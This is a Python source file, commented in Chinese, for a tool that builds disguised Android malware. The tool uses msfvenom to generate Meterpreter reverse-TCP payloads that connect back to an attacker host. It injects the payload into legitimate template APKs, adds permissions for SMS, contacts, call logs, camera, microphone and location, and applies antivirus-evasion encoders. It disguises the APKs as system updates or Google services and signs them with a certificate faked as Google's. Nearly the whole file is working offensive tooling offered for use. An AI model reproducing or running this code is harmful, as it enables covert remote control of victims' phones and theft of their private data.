import subprocess
import os
import time
import logging
import random
import string
import hashlib
import shutil
import re
import zipfile
from pathlib import Path

logger = logging.getLogger(__name__)

class PayloadGenerator:
    def __init__(self, output_dir="payloads"):
        self.output_dir = output_dir
        self.work_dir = os.path.join(output_dir, "work")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        if not os.path.exists(self.work_dir):
            os.makedirs(self.work_dir)
    
    def generate_android_payload(self, lhost, lport=4444, payload_name=None, 
                               app_name="System Update", use_embed=False, 
                               template_apk=None, obfuscation_level=1, 
                               use_encoder=False, iteration_count=1,
                               architecture="arm",
                               use_apktool=False,  # 新增：是否使用apktool
                               disguise_config=None):  # 新增：伪装配置
        """生成Android恶意载荷（增强版，支持apktool深度伪装）"""
        try:
            if not payload_name:
                timestamp = int(time.time())
                random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                real_names = ["SystemUpdate", "SecurityPatch", "AppOptimizer", 
                            "PerformanceBoost", "BugFixes", "CriticalUpdate",
                            "GooglePlayServices", "AndroidSystem", "SecurityCenter"]
                base_name = random.choice(real_names)
                payload_name = f"{base_name}_v{random.randint(1,5)}.{random.randint(0,9)}.{random.randint(0,9)}_{timestamp}.apk"
            
            payload_path = os.path.join(self.output_dir, payload_name)
            
            # 选择payload和编码器
            if architecture == "arm":
                payload = "android/meterpreter/reverse_tcp"
                encoders = ["armle/base64"]
            elif architecture == "arm64":
                payload = "android/meterpreter/reverse_tcp"
                encoders = ["aarch64/base64"]
            elif architecture == "x86":
                payload = "android/meterpreter/reverse_tcp"
                encoders = ["x86/shikata_ga_nai", "x86/jmp_call_additive"]
            elif architecture == "x64":
                payload = "android/meterpreter/reverse_tcp" 
                encoders = ["x64/xor"]
            else:
                payload = "android/meterpreter/reverse_tcp"
                encoders = ["armle/base64"]
            
            # 如果使用apktool进行深度伪装
            if use_apktool and template_apk and os.path.exists(template_apk):
                # 使用模板APK的名称
                if not payload_name:
                    template_name = os.path.basename(template_apk)
                    payload_name = f"{os.path.splitext(template_name)[0]}_payload.apk"
                    payload_path = os.path.join(self.output_dir, payload_name)
                return self._generate_with_apktool(
                    lhost=lhost,
                    lport=lport,
                    payload_name=payload_name,
                    payload_path=payload_path,
                    template_apk=template_apk,
                    disguise_config=disguise_config,
                    architecture=architecture
                )
            
            # 基础msfvenom命令
            cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
            ]
            
            # 添加编码器（免杀）
            encoder = None
            if use_encoder and encoders:
                encoder = random.choice(encoders)
                cmd.extend(["-e", encoder, "-i", str(iteration_count)])
                logger.info(f"使用编码器: {encoder}, 迭代次数: {iteration_count}")
            
            # 添加模板APK（伪装）
            if use_embed and template_apk and os.path.exists(template_apk):
                cmd.extend(["-x", template_apk])
                logger.info(f"使用模板APK: {template_apk}")
            
            # 设置输出格式
            cmd.extend(["-o", payload_path])
            
            logger.info(f"生成Android载荷: {' '.join(cmd)}")
            logger.info(f"目标架构: {architecture}")
            
            # 执行命令
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            
            if os.path.exists(payload_path):
                # 对APK进行后处理（签名和优化）
                self._post_process_apk(payload_path, obfuscation_level)
                
                file_size = os.path.getsize(payload_path)
                file_hash = self._calculate_file_hash(payload_path)
                
                logger.info(f"载荷生成成功: {payload_path} ({file_size} bytes)")
                logger.info(f"文件哈希: {file_hash}")
                
                return {
                    "success": True,
                    "payload_path": payload_path,
                    "payload_name": payload_name,
                    "file_size": file_size,
                    "file_hash": file_hash,
                    "lhost": lhost,
                    "lport": lport,
                    "architecture": architecture,
                    "obfuscation_level": obfuscation_level,
                    "used_encoder": encoder if use_encoder else None,
                    "used_template": template_apk if use_embed else None,
                    "used_apktool": False
                }
            else:
                logger.error("载荷文件未生成")
                return {"success": False, "error": "Payload file not created"}
                
        except subprocess.CalledProcessError as e:
            logger.error(f"msfvenom执行失败: {e}")
            logger.error(f"错误输出: {e.stderr}")
            return {"success": False, "error": f"msfvenom failed: {e.stderr}"}
        except Exception as e:
            logger.error(f"载荷生成异常: {e}")
            return {"success": False, "error": str(e)}
    
    def _generate_with_apktool(self, lhost, lport, payload_name, payload_path, 
                              template_apk, disguise_config, architecture):
        """使用apktool进行深度伪装生成"""
        try:
            work_dir = os.path.join(self.work_dir, f"apktool_{int(time.time())}")
            os.makedirs(work_dir, exist_ok=True)
            
            logger.info(f"使用apktool进行深度伪装: {template_apk}")
            
            # 1. 反编译模板APK
            decompiled_dir = os.path.join(work_dir, "decompiled")
            if not self._decompile_apk(template_apk, decompiled_dir):
                return {"success": False, "error": "APK反编译失败"}
            
            # 2. 生成meterpreter payload
            payload_apk = os.path.join(work_dir, "payload.apk")
            if not self._generate_meterpreter_apk(lhost, lport, payload_apk, architecture):
                return {"success": False, "error": "Meterpreter payload生成失败"}
            
            # 3. 反编译payload
            payload_decompiled = os.path.join(work_dir, "payload_decompiled")
            if not self._decompile_apk(payload_apk, payload_decompiled):
                return {"success": False, "error": "Payload反编译失败"}
            
            # 4. 合并payload到模板
            if not self._merge_payload(decompiled_dir, payload_decompiled):
                return {"success": False, "error": "Payload合并失败"}
            
            # 5. 应用伪装配置
            if disguise_config:
                self._apply_disguise(decompiled_dir, disguise_config)
            
            # 6. 应用代码混淆（暂时禁用，避免编译错误）
            # self._apply_code_obfuscation(decompiled_dir)
            logger.info("代码混淆已禁用，确保APK编译成功")
            
            # 7. 重新打包APK
            unsigned_apk = os.path.join(work_dir, "unsigned.apk")
            if not self._recompile_apk(decompiled_dir, unsigned_apk):
                return {"success": False, "error": "APK重新打包失败"}
            
            # 8. 签名APK
            if not self._sign_apk(unsigned_apk, payload_path):
                return {"success": False, "error": "APK签名失败"}
            
            # 9. 优化APK
            self._optimize_apk(payload_path)
            
            # 清理工作目录
            shutil.rmtree(work_dir, ignore_errors=True)
            
            if os.path.exists(payload_path):
                file_size = os.path.getsize(payload_path)
                file_hash = self._calculate_file_hash(payload_path)
                
                logger.info(f"深度伪装载荷生成成功: {payload_path} ({file_size} bytes)")
                
                return {
                    "success": True,
                    "payload_path": payload_path,
                    "payload_name": payload_name,
                    "file_size": file_size,
                    "file_hash": file_hash,
                    "lhost": lhost,
                    "lport": lport,
                    "architecture": architecture,
                    "used_apktool": True,
                    "template_apk": template_apk,
                    "disguise_applied": bool(disguise_config)
                }
            else:
                return {"success": False, "error": "最终APK文件未生成"}
                
        except Exception as e:
            logger.error(f"apktool生成失败: {e}")
            # 清理工作目录
            if 'work_dir' in locals() and os.path.exists(work_dir):
                shutil.rmtree(work_dir, ignore_errors=True)
            return {"success": False, "error": str(e)}
    
    def _decompile_apk(self, apk_path, output_dir):
        """使用apktool反编译APK"""
        try:
            cmd = ["apktool", "d", "-f", "-o", output_dir, apk_path]
            logger.info(f"反编译APK: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                logger.info(f"APK反编译成功: {output_dir}")
                return True
            else:
                logger.error(f"APK反编译失败: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"APK反编译异常: {e}")
            return False
    
    def _generate_meterpreter_apk(self, lhost, lport, output_path, architecture):
        """生成meterpreter APK"""
        try:
            payload = "android/meterpreter/reverse_tcp"
            
            cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-o", output_path
            ]
            
            logger.info(f"生成Meterpreter APK: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 and os.path.exists(output_path):
                logger.info(f"Meterpreter APK生成成功: {output_path}")
                return True
            else:
                logger.error(f"Meterpreter APK生成失败: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"Meterpreter APK生成异常: {e}")
            return False
    
    def _merge_payload(self, template_dir, payload_dir):
        """合并payload到模板APK"""
        try:
            # 复制payload的smali代码到模板
            payload_smali = os.path.join(payload_dir, "smali")
            template_smali = os.path.join(template_dir, "smali")
            
            if os.path.exists(payload_smali):
                # 找到可用的smali目录（可能有smali_classes2等）
                smali_dirs = [d for d in os.listdir(template_dir) if d.startswith("smali")]
                if not smali_dirs:
                    logger.error("模板中没有找到smali目录")
                    return False
                
                target_smali = os.path.join(template_dir, smali_dirs[-1])  # 使用最后一个smali目录
                
                # 复制payload的smali文件
                for root, dirs, files in os.walk(payload_smali):
                    for file in files:
                        if file.endswith(".smali"):
                            src_path = os.path.join(root, file)
                            rel_path = os.path.relpath(src_path, payload_smali)
                            dst_path = os.path.join(target_smali, rel_path)
                            
                            os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                            shutil.copy2(src_path, dst_path)
                
                logger.info(f"Payload smali代码合并完成")
            
            # 修改AndroidManifest.xml添加权限和入口
            manifest_path = os.path.join(template_dir, "AndroidManifest.xml")
            if os.path.exists(manifest_path):
                self._modify_manifest(manifest_path)
            
            return True
        except Exception as e:
            logger.error(f"Payload合并失败: {e}")
            return False
    
    def _modify_manifest(self, manifest_path):
        """修改AndroidManifest.xml添加必要的权限"""
        try:
            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # 添加meterpreter需要的权限
            permissions = [
                '<uses-permission android:name="android.permission.INTERNET"/>',
                '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
                '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
                '<uses-permission android:name="android.permission.READ_SMS"/>',
                '<uses-permission android:name="android.permission.SEND_SMS"/>',
                '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
                '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                '<uses-permission android:name="android.permission.CAMERA"/>',
                '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
                '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
                '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
                '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>'
            ]
            
            # 在<application>之前添加权限（正确的XML结构）
            application_start = content.find('<application')
            if application_start != -1:
                new_permissions = '\n    '.join(permissions)
                content = content[:application_start] + new_permissions + '\n    ' + content[application_start:]
            else:
                # 如果没有<application>标签，在</manifest>之前添加
                manifest_end = content.rfind('</manifest>')
                if manifest_end != -1:
                    new_permissions = '\n    '.join(permissions)
                    content = content[:manifest_end] + '    ' + new_permissions + '\n' + content[manifest_end:]
            
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            logger.info("AndroidManifest.xml修改完成")
            return True
        except Exception as e:
            logger.error(f"修改AndroidManifest.xml失败: {e}")
            return False
    
    def _apply_disguise(self, decompiled_dir, disguise_config):
        """应用伪装配置"""
        try:
            # 修改应用名称
            app_name = disguise_config.get('app_name')
            if app_name:
                self._change_app_name(decompiled_dir, app_name)
            
            # 修改包名
            package_name = disguise_config.get('package_name')
            if package_name:
                self._change_package_name(decompiled_dir, package_name)
            
            # 替换图标
            icon_path = disguise_config.get('icon_path')
            if icon_path and os.path.exists(icon_path):
                self._replace_icon(decompiled_dir, icon_path)
            
            # 修改版本信息
            version_info = disguise_config.get('version_info')
            if version_info:
                self._change_version_info(decompiled_dir, version_info)
            
            logger.info("伪装配置应用完成")
        except Exception as e:
            logger.error(f"应用伪装配置失败: {e}")
    
    def _change_app_name(self, decompiled_dir, app_name):
        """修改应用名称"""
        try:
            # 查找并修改strings.xml
            res_dir = os.path.join(decompiled_dir, "res")
            for root, dirs, files in os.walk(res_dir):
                for file in files:
                    if file == "strings.xml":
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # 替换应用名称
                        content = re.sub(
                            r'<string name="app_name">[^<]+</string>',
                            f'<string name="app_name">{app_name}</string>',
                            content
                        )
                        
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(content)
            
            logger.info(f"应用名称修改为: {app_name}")
        except Exception as e:
            logger.error(f"修改应用名称失败: {e}")
    
    def _change_package_name(self, decompiled_dir, package_name):
        """修改包名"""
        try:
            manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
            if os.path.exists(manifest_path):
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # 替换包名
                content = re.sub(
                    r'package="[^"]+"',
                    f'package="{package_name}"',
                    content
                )
                
                with open(manifest_path, 'w', encoding='utf-8') as f:
                    f.write(content)
            
            logger.info(f"包名修改为: {package_name}")
        except Exception as e:
            logger.error(f"修改包名失败: {e}")
    
    def _replace_icon(self, decompiled_dir, icon_path):
        """替换应用图标"""
        try:
            res_dir = os.path.join(decompiled_dir, "res")
            
            # 查找所有图标目录
            icon_dirs = []
            for item in os.listdir(res_dir):
                if item.startswith("mipmap") or item.startswith("drawable"):
                    item_path = os.path.join(res_dir, item)
                    if os.path.isdir(item_path):
                        icon_dirs.append(item_path)
            
            # 替换图标 - 支持更多图标文件名
            icon_files = ["ic_launcher.png", "ic_launcher.webp", "icon.png", "app_icon.png", "launcher_icon.png"]
            for icon_dir in icon_dirs:
                for icon_file in icon_files:
                    target_path = os.path.join(icon_dir, icon_file)
                    if os.path.exists(target_path):
                        shutil.copy2(icon_path, target_path)
            
            logger.info("图标替换完成")
        except Exception as e:
            logger.error(f"替换图标失败: {e}")
    
    def _change_version_info(self, decompiled_dir, version_info):
        """修改版本信息"""
        try:
            manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
            if os.path.exists(manifest_path):
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                version_code = version_info.get('version_code', '1')
                version_name = version_info.get('version_name', '1.0')
                
                # 替换版本信息
                content = re.sub(
                    r'android:versionCode="[^"]+"',
                    f'android:versionCode="{version_code}"',
                    content
                )
                content = re.sub(
                    r'android:versionName="[^"]+"',
                    f'android:versionName="{version_name}"',
                    content
                )
                
                with open(manifest_path, 'w', encoding='utf-8') as f:
                    f.write(content)
            
            logger.info(f"版本信息修改为: {version_name} ({version_code})")
        except Exception as e:
            logger.error(f"修改版本信息失败: {e}")
    
    def _apply_code_obfuscation(self, decompiled_dir):
        """应用代码混淆 - 已禁用"""
        logger.info("代码混淆功能已禁用，避免编译错误")
        return
    
    def _obfuscate_smali(self, content):
        """混淆smali代码"""
        try:
            # 1. 混淆字符串
            content = self._obfuscate_strings(content)
            
            # 2. 添加垃圾代码
            content = self._add_junk_code(content)
            
            # 3. 重命名局部变量
            content = self._rename_locals(content)
            
            return content
        except Exception as e:
            logger.warning(f"Smali混淆失败: {e}")
            return content
    
    def _obfuscate_strings(self, content):
        """混淆字符串（简单的字符串分割）- 安全版本"""
        try:
            # 找到方法声明，检查是否有.locals或.registers指令
            method_match = re.search(r'\.method.*\n', content)
            if not method_match:
                return content
            
            # 查找.locals指令，获取方法声明的局部寄存器数量
            locals_match = re.search(r'\.locals\s+(\d+)', content)
            if locals_match:
                local_registers = int(locals_match.group(1))
                # 方法参数寄存器从v{local_registers}开始
                # 为了安全，我们只使用v0-v15
                if local_registers > 16:
                    return content  # 寄存器数量太多，跳过混淆
            
            # 为了安全，只使用v0-v15范围内的寄存器
            # 避免使用可能超出方法声明范围的寄存器
            safe_reg = 14  # 使用v14，这是一个相对安全的寄存器编号
            
            # 找到所有字符串常量
            string_pattern = r'const-string(?:/jumbo)? (v\d+), "([^"]+)"'
            matches = list(re.finditer(string_pattern, content))
            
            for match in reversed(matches):  # 反向处理以避免位置变化
                reg = match.group(1)
                string_val = match.group(2)
                
                # 只对较短的字符串进行混淆
                if len(string_val) > 3 and len(string_val) < 50:
                    # 简单的字符串分割混淆
                    mid = len(string_val) // 2
                    part1 = string_val[:mid]
                    part2 = string_val[mid:]
                    
                    # 使用安全的寄存器编号（v14）
                    replacement = f'''    const-string {reg}, "{part1}"
    new-instance v14, Ljava/lang/StringBuilder;
    invoke-direct {{v14}}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {{v14, {reg}}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string {reg}, "{part2}"
    invoke-virtual {{v14, {reg}}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {{v14}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object {reg}'''
                    
                    content = content[:match.start()] + replacement + content[match.end():]
            
            return content
        except Exception as e:
            logger.warning(f"字符串混淆失败: {e}")
            return content
    
    def _add_junk_code(self, content):
        """添加垃圾代码 - 安全版本"""
        try:
            # 检查是否是抽象方法（抽象方法不能有实现）
            if 'abstract' in content:
                return content  # 抽象方法跳过混淆
            
            # 查找.locals指令，获取方法声明的局部寄存器数量
            locals_match = re.search(r'\.locals\s+(\d+)', content)
            if locals_match:
                local_registers = int(locals_match.group(1))
                # 方法参数寄存器从v{local_registers}开始
                # 为了安全，我们只使用v0-v15
                if local_registers > 16:
                    return content  # 寄存器数量太多，跳过混淆
            
            # 为了安全，只使用v0-v15范围内的寄存器
            # 避免使用可能超出方法声明范围的寄存器
            # 使用v10-v12，这些寄存器通常不会被频繁使用
            junk_code = '''
    # Junk code for obfuscation
    const/4 v10, 0x0
    const/4 v11, 0x1
    add-int v12, v10, v11
'''
            
            # 找到所有方法开始的位置
            method_pattern = r'\.method.*\n'
            content = re.sub(method_pattern, lambda m: m.group() + junk_code, content)
            
            return content
        except Exception as e:
            logger.warning(f"添加垃圾代码失败: {e}")
            return content
    
    def _rename_locals(self, content):
        """重命名局部变量"""
        try:
            # 简单的变量重命名
            # 注意：这可能会破坏代码，需要谨慎使用
            return content
        except Exception as e:
            logger.warning(f"变量重命名失败: {e}")
            return content
    
    def _recompile_apk(self, decompiled_dir, output_apk):
        """重新编译APK"""
        try:
            cmd = ["apktool", "b", "--use-aapt2", "-o", output_apk, decompiled_dir]
            logger.info(f"重新编译APK: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                logger.info(f"APK重新编译成功: {output_apk}")
                return True
            else:
                logger.error(f"APK重新编译失败: {result.stderr}")
                # 如果aapt2失败，尝试使用aapt1
                logger.info("尝试使用aapt1重新编译...")
                cmd_fallback = ["apktool", "b", "-o", output_apk, decompiled_dir]
                result_fallback = subprocess.run(cmd_fallback, capture_output=True, text=True, timeout=300)
                if result_fallback.returncode == 0:
                    logger.info(f"APK重新编译成功（使用aapt1）: {output_apk}")
                    return True
                else:
                    logger.error(f"APK重新编译失败（aapt1）: {result_fallback.stderr}")
                    return False
        except Exception as e:
            logger.error(f"APK重新编译异常: {e}")
            return False
    
    def _sign_apk(self, input_apk, output_apk):
        """签名APK"""
        try:
            # 生成密钥库
            keystore_path = os.path.join(self.output_dir, "android.keystore")
            if not os.path.exists(keystore_path):
                keytool_cmd = [
                    "keytool", "-genkey", "-v",
                    "-keystore", keystore_path,
                    "-alias", "android",
                    "-keyalg", "RSA",
                    "-keysize", "2048",
                    "-validity", "10000",
                    "-storepass", "android",
                    "-keypass", "android",
                    "-dname", "CN=Android Debug, OU=Android, O=Google, L=Mountain View, ST=California, C=US"
                ]
                subprocess.run(keytool_cmd, capture_output=True, check=True)
            
            # 使用apksigner签名（Android SDK）
            try:
                sign_cmd = [
                    "apksigner", "sign",
                    "--ks", keystore_path,
                    "--ks-pass", "pass:android",
                    "--key-pass", "pass:android",
                    "--out", output_apk,
                    input_apk
                ]
                result = subprocess.run(sign_cmd, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    logger.info(f"APK签名成功: {output_apk}")
                    return True
            except:
                pass
            
            # 备选：使用jarsigner
            try:
                sign_cmd = [
                    "jarsigner",
                    "-verbose",
                    "-sigalg", "SHA1withRSA",
                    "-digestalg", "SHA1",
                    "-keystore", keystore_path,
                    "-storepass", "android",
                    "-keypass", "android",
                    input_apk,
                    "android"
                ]
                result = subprocess.run(sign_cmd, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    shutil.copy2(input_apk, output_apk)
                    logger.info(f"APK签名成功（jarsigner）: {output_apk}")
                    return True
            except:
                pass
            
            # 如果签名失败，直接复制未签名版本
            shutil.copy2(input_apk, output_apk)
            logger.warning(f"APK签名失败，使用未签名版本: {output_apk}")
            return True
            
        except Exception as e:
            logger.error(f"APK签名异常: {e}")
            # 复制未签名版本作为备选
            try:
                shutil.copy2(input_apk, output_apk)
                return True
            except:
                return False
    
    def _optimize_apk(self, apk_path):
        """优化APK（使用zipalign）"""
        try:
            # 检查zipalign是否可用
            result = subprocess.run(["zipalign", "-h"], capture_output=True)
            if result.returncode == 0:
                aligned_apk = apk_path + ".aligned"
                cmd = ["zipalign", "-v", "4", apk_path, aligned_apk]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                
                if result.returncode == 0 and os.path.exists(aligned_apk):
                    shutil.move(aligned_apk, apk_path)
                    logger.info(f"APK优化完成: {apk_path}")
        except Exception as e:
            logger.warning(f"APK优化失败: {e}")
    
    def _post_process_apk(self, apk_path, obfuscation_level):
        """对APK进行后处理（签名和优化）"""
        try:
            # 1. 使用apksigner重新签名（如果可用）
            if self._check_tool_available("apksigner"):
                self._resign_apk(apk_path)
            
            # 2. 根据混淆级别进行额外处理
            if obfuscation_level >= 2:
                self._apply_advanced_obfuscation(apk_path)
            
            logger.info(f"APK后处理完成: {apk_path}")
            
        except Exception as e:
            logger.warning(f"APK后处理失败: {e}")
    
    def _resign_apk(self, apk_path):
        """重新签名APK"""
        try:
            # 生成临时密钥库
            keystore_path = os.path.join(self.output_dir, "temp.keystore")
            if not os.path.exists(keystore_path):
                keytool_cmd = [
                    "keytool", "-genkey", "-v",
                    "-keystore", keystore_path,
                    "-alias", "androidkey",
                    "-keyalg", "RSA",
                    "-keysize", "2048",
                    "-validity", "10000",
                    "-storepass", "android",
                    "-keypass", "android",
                    "-dname", "CN=Android, OU=Android, O=Google, L=Mountain View, ST=California, C=US"
                ]
                subprocess.run(keytool_cmd, capture_output=True, check=True)
            
            # 使用apksigner签名
            apksigner_cmd = [
                "apksigner", "sign",
                "--ks", keystore_path,
                "--ks-pass", "pass:android",
                "--key-pass", "pass:android",
                apk_path
            ]
            subprocess.run(apksigner_cmd, capture_output=True, check=True)
            
            logger.info(f"APK重新签名完成: {apk_path}")
            
        except Exception as e:
            logger.warning(f"APK签名失败: {e}")
    
    def _apply_advanced_obfuscation(self, apk_path):
        """应用高级混淆技术"""
        try:
            logger.info(f"应用高级混淆: {apk_path}")
        except Exception as e:
            logger.warning(f"高级混淆失败: {e}")
    
    def _calculate_file_hash(self, file_path):
        """计算文件哈希值"""
        try:
            hasher = hashlib.sha256()
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hasher.update(chunk)
            return hasher.hexdigest()
        except:
            return "unknown"
    
    def _check_tool_available(self, tool_name):
        """检查工具是否可用"""
        try:
            subprocess.run([tool_name, "--version"], capture_output=True)
            return True
        except:
            return False
    
    def generate_stealth_payload(self, lhost, lport=4444, stealth_level="medium",
                               architecture="arm", template_apk=None,
                               use_apktool=False, disguise_config=None,
                               app_name=None):
        """生成隐身载荷（预设的免杀配置）"""
        stealth_configs = {
            "low": {
                "use_encoder": False,
                "obfuscation_level": 1,
                "iteration_count": 1
            },
            "medium": {
                "use_encoder": True,
                "obfuscation_level": 2,
                "iteration_count": 3
            },
            "high": {
                "use_encoder": True,
                "obfuscation_level": 3,
                "iteration_count": 5
            }
        }
        
        config = stealth_configs.get(stealth_level, stealth_configs["medium"])
        
        # 只有明确指定use_apktool=True且提供了template_apk时才使用apktool
        # 不再自动启用apktool
        
        return self.generate_android_payload(
            lhost=lhost,
            lport=lport,
            app_name=app_name or "System Update",
            use_encoder=config["use_encoder"],
            obfuscation_level=config["obfuscation_level"],
            iteration_count=config["iteration_count"],
            architecture=architecture,
            use_apktool=use_apktool,
            template_apk=template_apk,
            disguise_config=disguise_config
        )
    
    def get_supported_architectures(self):
        """获取支持的架构列表"""
        return {
            "arm": "ARM架构 - 大多数Android设备",
            "arm64": "ARM64架构 - 现代Android设备", 
            "x86": "x86架构 - 少数Android设备",
            "x64": "x64架构 - 罕见Android设备",
            "auto": "自动检测 - 推荐"
        }
    
    def list_payloads(self):
        """列出所有生成的载荷"""
        try:
            if not os.path.exists(self.output_dir):
                return []
            
            payloads = []
            for filename in os.listdir(self.output_dir):
                if filename.endswith('.apk'):
                    filepath = os.path.join(self.output_dir, filename)
                    file_stats = os.stat(filepath)
                    
                    payloads.append({
                        "name": filename,
                        "path": filepath,
                        "size": file_stats.st_size,
                        "created": file_stats.st_ctime,
                        "modified": file_stats.st_mtime
                    })
            
            # 按创建时间倒序排列
            return sorted(payloads, key=lambda x: x["created"], reverse=True)
            
        except Exception as e:
            logger.error(f"列出载荷失败: {e}")
            return []
    
    def cleanup_old_payloads(self, keep_count=10):
        """清理旧的载荷文件"""
        try:
            payloads = self.list_payloads()
            if len(payloads) > keep_count:
                for payload in payloads[keep_count:]:
                    try:
                        os.remove(payload["path"])
                        logger.info(f"删除旧载荷: {payload['name']}")
                    except Exception as e:
                        logger.error(f"删除载荷失败 {payload['name']}: {e}")
        except Exception as e:
            logger.error(f"清理旧载荷失败: {e}")
    
    def get_payload_info(self, payload_name):
        """获取特定载荷的详细信息"""
        try:
            payload_path = os.path.join(self.output_dir, payload_name)
            if not os.path.exists(payload_path):
                return None
            
            file_stats = os.stat(payload_path)
            file_hash = self._calculate_file_hash(payload_path)
            
            return {
                "name": payload_name,
                "path": payload_path,
                "size": file_stats.st_size,
                "created": file_stats.st_ctime,
                "modified": file_stats.st_mtime,
                "hash": file_hash,
                "readable_size": self._format_file_size(file_stats.st_size)
            }
        except Exception as e:
            logger.error(f"获取载荷信息失败: {e}")
            return None
    
    def _format_file_size(self, size_bytes):
        """格式化文件大小"""
        if size_bytes == 0:
            return "0B"
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names)-1:
            size_bytes /= 1024.0
            i += 1
        return f"{size_bytes:.2f} {size_names[i]}"
    
    def delete_payload(self, payload_name):
        """删除指定的载荷文件"""
        try:
            payload_path = os.path.join(self.output_dir, payload_name)
            if os.path.exists(payload_path):
                os.remove(payload_path)
                logger.info(f"删除载荷: {payload_name}")
                return True
            else:
                logger.warning(f"载荷文件不存在: {payload_name}")
                return False
        except Exception as e:
            logger.error(f"删除载荷失败: {e}")
            return False
